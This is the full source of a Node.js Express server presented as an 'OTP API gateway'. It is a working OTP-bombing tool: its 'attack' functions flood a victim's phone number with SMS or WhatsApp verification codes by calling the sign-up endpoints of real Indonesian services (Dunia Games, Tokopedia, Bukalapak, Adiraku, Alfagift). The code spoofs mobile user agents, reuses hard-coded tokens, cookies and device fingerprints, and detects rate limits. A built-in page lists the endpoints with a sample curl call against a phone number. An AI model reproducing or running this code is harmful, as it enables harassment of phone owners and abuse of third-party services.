const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());

// --- ULTIMATE MOBILE USER-AGENT POOL ---
function getRandomUA() {
    const devices = [
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Xiaomi 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.89 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 12; SM-A536E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; V2309) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    ];
    return devices[Math.floor(Math.random() * devices.length)];
}

function formatPhonePlus(rawInputNo) {
    let cleaned = rawInputNo.trim().replace(/^\+/, "");
    if (cleaned.startsWith("0")) return "+62" + cleaned.slice(1);
    if (cleaned.startsWith("8")) return "+62" + cleaned;
    if (cleaned.startsWith("62")) return "+" + cleaned;
    return "+62" + cleaned;
}

function formatMobileLocal(rawInputNo) {
    let cleaned = rawInputNo.trim().replace(/^\+/, "");
    if (cleaned.startsWith("62")) cleaned = "0" + cleaned.slice(2);
    else if (cleaned.startsWith("+62")) cleaned = "0" + cleaned.slice(3);
    else if (!cleaned.startsWith("0")) cleaned = "0" + cleaned;
    return cleaned;
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

// --- 1. DUNIA GAMES ---
async function attackDuniaGames(rawNumber) {
    const phoneNumber = formatPhonePlus(rawNumber);
    const userName = phoneNumber.replace("+62", "0");
    const url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp";
    
    const headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json",
        "Origin": "https://duniagames.co.id",
        "Referer": "https://duniagames.co.id/",
        "Sec-Ch-Ua": '"Chromium";v="123", "Not:A-Brand";v="8", "Google Chrome";v="123"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Ciam-Type": "FR",
        "X-Device": "8fe502f3-8377-4535-b1f3-0e3cb790b98a",
        "User-Agent": getRandomUA()
    };
    try {
        const res = await axios.post(url, { phoneNumber, userName }, { headers, timeout: 8000, validateStatus: () => true });
        const resText = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
        return { success: res.status === 200, status: res.status, raw: resText.slice(0, 100) };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// --- 2. TOKOPEDIA ---
async function attackTokopedia(rawNumber) {
    const nomer = formatPhonePlus(rawNumber);
    const headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'id-ID,id;q=0.9',
        'Connection': 'keep-alive',
        'Origin': 'https://accounts.tokopedia.com',
        'Referer': 'https://accounts.tokopedia.com/',
        'User-Agent': getRandomUA(),
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    };
    try {
        const encodedNomer = encodeURIComponent(nomer);
        const ldVal = encodeURIComponent(`https://accounts.tokopedia.com/register?type=phone&phone=${nomer}&status=eyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ==`);
        const pageUrl = `https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=${encodedNomer}&ld=${ldVal}`;
        
        const pageRes = await axios.get(pageUrl, { headers, timeout: 8000, validateStatus: () => true });
        const $ = cheerio.load(pageRes.data);
        const token = $('#Token').val();
        
        if (!token) return { success: false, error: "Token Tokopedia tidak ditemukan di halaman" };
        
        const formulir = new URLSearchParams({
            "otp_type": "116", "msisdn": nomer, "tk": token, "email": "",
            "original_param": "", "user_id": "", "signature": "", "number_otp_digit": "6"
        }).toString();
        
        const reqRes = await axios.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', formulir, { headers, timeout: 8000, validateStatus: () => true });
        const reqText = typeof reqRes.data === 'string' ? reqRes.data : JSON.stringify(reqRes.data);
        
        if (reqText.includes('Anda sudah melakukan 3 kali pengiriman kode')) {
            return { success: false, limit: true, message: "Tokopedia mencapai batas (Limit 3x)" };
        }
        return { success: reqText.includes('success":true') || reqText.startsWith("{"), status: reqRes.status, raw: reqText.slice(0, 100) };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// --- 3. BUKALAPAK ---
async function attackBukalapak(rawNumber) {
    const phoneLocal = formatMobileLocal(rawNumber);
    const url = "https://accounts.bukalapak.com/register";
    const cookieHeader = [
        "browser_id=a23308cc6e08504dee597c30a73e623e",
        "identity=2af545f4064bbcee3a28fa98b5b2913d",
        "session_id=5f76a81f2d614928803f1d721a1a2384"
    ].join("; ");

    const headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "id-ID,id;q=0.9",
        "Bukalapak-Identity": "2af545f4064bbcee3a28fa98b5b2913d",
        "Bukalapak-OTP-Device-ID": "2af545f4064bbcee3a28fa98b5b2913d",
        "Bukalapak-OTP-Method": "whatsapp",
        "Content-Type": "application/json", 
        "Cookie": cookieHeader,
        "Origin": "https://accounts.bukalapak.com",
        "Referer": "https://accounts.bukalapak.com/register",
        "User-Agent": getRandomUA()
    };
    const payload = {
        "access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImFjY291bnRzLmp3dC5hY2Nlc3MtdG9rZW4tMjAyNTExMTciLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmJ1a2FsYXBhay5jb20vIiwic3ViIjoiMjMxZDRhODY5MDVmMGYyNjJjNWUwM2ZjIiwiYXVkIjpbImh0dHBzOi8vYWNjb3VudHMuYnVrYWxhcGFrLmNvbSIsImh0dHBzOi8vYXBpLmJ1a2FsYXBhay5jb20iLCJodHRwczovL2FwaS5zZXJ2ZXJtaXRyYS5jb20iXSwiZXhwIjoxNzk0NzU2NDMwLCJuYmYiOjE3OTQ3NDU4NzAsImlhdCI6MTc5NDc0NTg3MCwianRpIjoiQlN1eDB5WHdaTk1RRk96X0JYcFdHZyIsImNsaWVudF9pZCI6IjIzMWQ0YTg2OTA1ZjBmMjYyYzVlMDNmYyIsInNjb3BlIjoicHVibGljIn0.V5qvvTsCJlYYWk2pnPgWxMYOM4qBjp5pspMdEhR91u7YQ80Htr0OvEQFGc2n9NhG4yqZ57mRbPwEtvyjjBpKS3BWNej0EOV-qusXaUrugYTVsjUhuk8k1lHLN9JJAD6kOswH2PAULyQ7LmgJxhczjFFjBwEEzDmz2mRHEmTmOWdGH3V_VWyg62z1aF_u9yDom8RTDgfnbzvWiC2hUloWq4ZA1iBfo8u8dXJwVbo0eOtQVQc5WhfppvR607LpydXrbWojPrRRdHBICoa2WvRwJVFvWuK_16A2RkMgsGo1rhniRzLA1vqZ06R61tPegVtY3HB-zrXiWNfTaUH7WNJvww",
        "user": { "phone": phoneLocal },
        "authenticity_token": "FDCFDSnQRPINfXcf4z6t9jJLieZf6kf4YuLvelLHfVNRzxDD6Y8iwsl3GJht7bhzlP6UgOEM007je4FkkOFt0Q=="
    };
    try {
        const res = await axios.post(url, payload, { headers, timeout: 8000, validateStatus: () => true });
        const resText = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
        const success = [200, 201, 401].includes(res.status) && resText.toLowerCase().includes("berhasil");
        return { success, status: res.status, raw: resText.slice(0, 100) };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// --- 4. ADIRAKU ---
async function attackAdiraku(rawNumber) {
    const mobileNumber = formatMobileLocal(rawNumber);
    const url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata';
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'id-ID,id;q=0.9',
        'Content-Type': 'application/json; charset=utf-8',
        'Origin': 'https://www.adiraku.co.id',
        'Referer': 'https://www.adiraku.co.id/',
        'User-Agent': getRandomUA()
    };
    const payload = { "mobileNumber": mobileNumber, "type": "prospect-create", "channel": "whatsapp" };
    try {
        const res = await axios.post(url, payload, { headers, timeout: 8000, validateStatus: () => true });
        const resText = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
        const success = resText.includes('"message":"success"') || res.status === 200;
        return { success, status: res.status, raw: resText.slice(0, 100) };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// --- 5. ALFAGIFT ---
async function attackAlfagift(rawNumber) {
    const phoneFull = formatMobileLocal(rawNumber);
    let headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "id-ID,id;q=0.9",
        "Content-Type": "application/json",
        "Origin": "https://alfagift.id",
        "Referer": "https://alfagift.id/",
        "Sec-Ch-Ua": '"Chromium";v="123", "Not:A-Brand";v="8", "Google Chrome";v="123"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "deviceModel": "chrome",
        "deviceType": "Web",
        "fingerprint": "drord//qrw2MP/ngN5zL1sLt4DlAiKddGVQl8at2zlrk1JTGdwlnxhTGwTyfm96+",
        "trxId": randomInt(1000000000, 9999999999).toString(),
        "User-Agent": getRandomUA()
    };
    try {
        const checkUrl = "https://webcommerce-gw.alfagift.id/v1/account/member/check";
        await axios.post(checkUrl, { login: phoneFull, loginType: "mobile", password: "", requestPosition: "CHECK" }, { headers, timeout: 6000, validateStatus: () => true });
        await sleep(300);
        
        const otpUrl = "https://webcommerce-gw.alfagift.id/v1/otp/request";
        headers["trxId"] = randomInt(1000000000, 9999999999).toString();
        const res = await axios.post(otpUrl, { data: "OjBc0DEld4FwJ1Xkbwi6LyrSUXkZEvNW6qfIN19xCE3wZZvsCgtqjbH58wPKZHAReW1KyXFLEQgXr2PGbdigOh4W89g4TA3K4gwTfLnNXxTv6iJZbepkJL//l3BforX9qQvQp+aZg+21brEUi6+bDQ==" }, { headers, timeout: 6000, validateStatus: () => true });
        const resText = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
        return { success: res.status === 200, status: res.status, raw: resText.slice(0, 100) };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// --- EXPRESS ROUTING ---

// Root Documentation Page
app.get('/', (req, res) => {
    const host = req.headers['x-forwarded-host'] || req.headers.host || 'localhost';
    const proto = req.headers['x-forwarded-proto'] || 'https';
    const baseUrl = `${proto}://${host}`;

    res.send(`
        <html>
        <head>
            <title>Penta-Source OTP API Gateway (Render)</title>
            <style>
                body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
                h1 { color: #58a6ff; }
                code { background: #161b22; padding: 2px 6px; border-radius: 4px; color: #f0f6fc; }
                pre { background: #161b22; padding: 15px; border-radius: 6px; overflow-x: auto; border: 1px solid #30363d; }
                .endpoint { color: #7ee787; }
            </style>
        </head>
        <body>
            <h1>🚀 Penta-Source OTP API Gateway (Render Native Express)</h1>
            <p>Status: <b style="color: #7ee787;">ONLINE & RUNNING</b></p>
            
            <h2>📌 Daftar Endpoint API:</h2>
            <ul>
                <li>Health Check: <a class="endpoint" href="${baseUrl}/api/health" target="_blank">${baseUrl}/api/health</a></li>
                <li>Dunia Games: <span class="endpoint">${baseUrl}/api/dugame?phone=08xxxxxxxxxx</span></li>
                <li>Tokopedia: <span class="endpoint">${baseUrl}/api/tokped?phone=08xxxxxxxxxx</span></li>
                <li>Bukalapak: <span class="endpoint">${baseUrl}/api/bukalap?phone=08xxxxxxxxxx</span></li>
                <li>Adiraku: <span class="endpoint">${baseUrl}/api/adiraku?phone=08xxxxxxxxxx</span></li>
                <li>Alfagift: <span class="endpoint">${baseUrl}/api/alfagift?phone=08xxxxxxxxxx</span></li>
            </ul>

            <h2>📱 Contoh Nembak via Termux (cURL):</h2>
            <pre>curl -X GET "${baseUrl}/api/tokped?phone=083829477519"</pre>
        </body>
        </html>
    `);
});

app.get('/api/health', (req, res) => {
    res.json({
        status: "success",
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        sources: { duniagames: "Active", tokopedia: "Active", bukalapak: "Active", adiraku: "Active", alfagift: "Active" }
    });
});

async function handleAttack(req, res, targetName, attackFunc) {
    let phone = req.query.phone || (req.body && req.body.phone);
    if (!phone) {
        return res.status(400).json({ status: false, message: "Parameter 'phone' wajib diisi!" });
    }
    try {
        const r = await attackFunc(phone);
        return res.json({ status: r.success, phone, result: { target: targetName, ...r } });
    } catch (err) {
        return res.status(500).json({ status: false, error: err.message });
    }
}

app.all('/api/dugame', (req, res) => handleAttack(req, res, "Dunia Games", attackDuniaGames));
app.all('/api/tokped', (req, res) => handleAttack(req, res, "Tokopedia", attackTokopedia));
app.all('/api/bukalap', (req, res) => handleAttack(req, res, "Bukalapak", attackBukalapak));
app.all('/api/adiraku', (req, res) => handleAttack(req, res, "Adiraku", attackAdiraku));
app.all('/api/alfagift', (req, res) => handleAttack(req, res, "Alfagift", attackAlfagift));

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
